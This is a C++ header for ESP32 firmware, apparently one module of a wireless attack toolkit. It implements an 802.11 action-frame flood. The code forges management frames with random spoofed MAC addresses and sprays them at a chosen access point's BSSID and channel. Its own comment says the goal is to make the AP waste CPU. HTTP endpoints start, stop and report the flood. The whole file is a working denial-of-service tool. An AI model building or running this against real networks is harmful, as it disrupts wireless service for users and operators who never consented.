#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// 802.11 Action frame flood — sprays frames across all action categories:
// Spectrum Management (0), QoS (1), DLS (2), Block Ack (3), Radio Meas (5),
// HT (7), SA Query (8), Protected Dual of Public (9), WNM (10), WMM (17).
// Causes AP to waste CPU processing invalid action frames.
static bool acf_running = false;
static uint8_t acf_ap[6] = {};
static uint8_t acf_ch = 6;
static bool    acf_bcast = true;
static volatile uint32_t acf_sent = 0;
static uint8_t acf_mode = 0; // 0=random, 1=spectrum, 2=block_ack, 3=sa_query, 4=wnm
static TaskHandle_t acf_task = nullptr;

static const uint8_t ACF_CATS[] = {0, 1, 2, 3, 5, 7, 8, 9, 10, 17};

static void acf_run(void*) {
  uint8_t f[80]; uint8_t sta[6];
  acf_sent = 0;
  uint8_t phase = 0;
  while (acf_running) {
    if (!safety_rate_ok(1)) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
    if (acf_bcast) {
      for (int k = 0; k < 6; k++) sta[k] = esp_random() & 0xFF;
      sta[0] = (sta[0] & 0xFE) | 0x02;
    }
    // Build action frame manually
    fhdr(f, 0xD0, 0x00, acf_bcast ? BC : acf_ap, sta, acf_ap);
    size_t p = 24;
    uint8_t cat = 0, act = 0;
    switch (acf_mode) {
      case 0: cat = ACF_CATS[phase % (sizeof(ACF_CATS))]; act = esp_random() & 0x0F; break;
      case 1: cat = 0;  act = 0; break; // Spectrum Meas request
      case 2: cat = 3;  act = 0; break; // ADDBA request
      case 3: cat = 8;  act = 0; break; // SA Query request
      case 4: cat = 10; act = 7; break; // WNM Sleep Mode
    }
    f[p++] = cat; f[p++] = act;
    for (int i = 0; i < 20; i++) f[p++] = (uint8_t)(esp_random() & 0xFF);
    esp_wifi_80211_tx(WIFI_IF_AP, f, p, false); acf_sent++;
    phase++;
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  acf_task = nullptr; vTaskDelete(nullptr);
}

static bool acf_start(const String& q) {
  int i; String bs, ch, mo, bc;
  if ((i = q.indexOf("bssid="))    >= 0) { int e=q.indexOf('&',i); bs=q.substring(i+6,e<0?q.length():e); }
  if ((i = q.indexOf("ch="))       >= 0) { int e=q.indexOf('&',i); ch=q.substring(i+3,e<0?q.length():e); }
  if ((i = q.indexOf("mode="))     >= 0) { int e=q.indexOf('&',i); mo=q.substring(i+5,e<0?q.length():e); }
  if ((i = q.indexOf("broadcast="))>= 0) { int e=q.indexOf('&',i); bc=q.substring(i+10,e<0?q.length():e); }
  if (bs.length() != 17) return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x",
    (unsigned*)&acf_ap[0],(unsigned*)&acf_ap[1],(unsigned*)&acf_ap[2],
    (unsigned*)&acf_ap[3],(unsigned*)&acf_ap[4],(unsigned*)&acf_ap[5]);
  acf_ch = ch.toInt(); if (!acf_ch) acf_ch = 6;
  acf_bcast = (bc != "0");
  if      (mo == "spectrum") acf_mode = 1;
  else if (mo == "blockack") acf_mode = 2;
  else if (mo == "saquery")  acf_mode = 3;
  else if (mo == "wnm")      acf_mode = 4;
  else                       acf_mode = 0;
  esp_wifi_set_channel(acf_ch, WIFI_SECOND_CHAN_NONE);
  acf_running = true;
  xTaskCreate(acf_run, "acf_run", 4096, nullptr, 5, &acf_task);
  return true;
}
static void acf_stop() { acf_running = false; }
static void acf_routes() {
  extern WebServer server;
  server.on("/api/actionflood/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("actionflood", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/actionflood/stop", HTTP_POST, [](){
    tool_stop("actionflood"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/actionflood/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(acf_running?1:0)+
      ",\"sent\":"+String(acf_sent)+
      ",\"msg\":\""+String(acf_sent)+" action frames\"}");
  });
}
